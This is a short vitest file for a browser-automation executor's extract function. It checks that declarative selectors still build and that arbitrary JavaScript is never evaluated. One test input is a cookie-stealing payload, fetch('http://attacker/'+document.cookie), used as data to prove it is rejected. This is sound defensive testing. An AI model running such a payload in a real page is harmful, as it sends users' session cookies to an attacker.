import { describe, it, expect } from "vitest";
import { buildExtractExpression } from "./executor.js";

// Audit (escape-hatch): extract must NOT evaluate arbitrary JS in-page.
describe("extract_query — no arbitrary-JS eval escape hatch", () => {
  it("a non-selector query produces an expression with no eval and returns null", () => {
    const expr = buildExtractExpression("fetch('http://attacker/'+document.cookie)");
    expect(expr).not.toMatch(/\beval\b/);
    expect(expr).toContain("return null");
  });
  it("declarative selectors still build (text/attr/value)", () => {
    expect(buildExtractExpression("text:.title")).toContain("textContent");
    expect(buildExtractExpression("attr:a@href")).toContain("getAttribute");
    expect(buildExtractExpression("value:#email")).toContain(".value");
  });
});
